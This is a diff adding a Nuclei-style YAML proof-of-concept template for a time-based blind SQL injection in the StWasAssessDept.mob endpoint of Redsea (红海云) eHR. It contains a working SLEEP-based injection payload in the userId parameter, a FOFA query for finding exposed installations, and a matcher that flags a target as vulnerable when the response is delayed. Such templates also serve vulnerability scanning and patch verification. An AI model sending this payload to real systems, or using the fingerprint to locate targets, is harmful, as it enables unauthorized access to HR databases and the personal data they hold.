@@ -1,0 +1,30 @@
+id: poc-fwwwbbgnvosl5hyf
+info:
+  name: 红海云eHR StWasAssessDept.mob 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fwwwbbgnvosl5hyf
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: fwwwbbgnvosl5hyf
+    fofa: body="/RedseaPlatform/skins/images/favicon.ico"
+http:
+- raw:
+  - 'GET /RedseaPlatform/submitStWasAssessDept/StWasAssessDept.mob?userId=''+AND+(SELECT+3266+FROM+(SELECT(SLEEP(5)))ShXk)+AND+''qmyT''=''qmyT HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Encoding: gzip
+
+    Connection: keep-alive
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
